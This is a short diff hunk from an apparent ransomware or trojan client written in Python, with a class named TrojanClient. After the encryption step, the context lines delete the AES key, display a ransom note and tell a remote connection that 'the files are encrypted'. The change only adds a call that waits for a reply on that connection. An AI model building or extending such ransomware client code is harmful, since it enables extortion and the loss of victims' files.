@@ -142,6 +142,8 @@ class TrojanClient:
         del aes_key
         RansomNote.display_encryption_note()
         protocol.send(self.connection, "the files are encrypted")
+        
+        protocol.receive(self.connection)
 
 
 
